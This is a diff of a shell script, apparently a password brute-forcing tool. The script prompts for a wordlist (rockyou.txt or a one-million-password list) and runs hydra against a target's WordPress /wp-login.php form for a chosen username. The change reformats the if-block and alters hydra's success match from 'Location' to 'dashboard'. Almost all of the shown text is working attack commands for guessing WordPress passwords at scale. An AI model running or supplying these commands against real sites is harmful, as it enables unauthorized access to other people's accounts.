@@ -42,11 +42,11 @@ select d in rockyou.txt 1milpwlist.txt;
 do test -n "$d" && break; 
 echo -e "$RED>>> Invalid Selection""$NC"; done
 
-if [ "$REPLY" == 1 ] ;
-then echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+if [ "$REPLY" == 1 ]; then 
+    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+    hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
-hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+    hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 fi
 
 # use pw-inspector to filter?
